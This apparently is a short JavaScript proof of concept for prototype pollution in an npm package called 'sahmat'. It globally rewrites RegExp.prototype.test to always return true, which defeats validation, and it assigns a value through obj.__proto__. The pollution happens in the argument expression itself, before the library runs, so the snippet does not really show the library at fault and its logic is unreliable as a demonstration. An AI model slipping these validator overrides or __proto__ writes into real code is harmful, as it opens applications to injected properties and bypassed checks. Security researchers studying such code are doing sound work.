RegExp.prototype.test = () => true;
const sahmat = require('sahmat');
let obj = { tmp: '' };
console.log({}.polluted);
sahmat(obj, 'tmp', obj.__proto__.polluted = 'yes');
console.log('{ ' + obj.tmp.polluted + ', ' + 'yes' + ' }');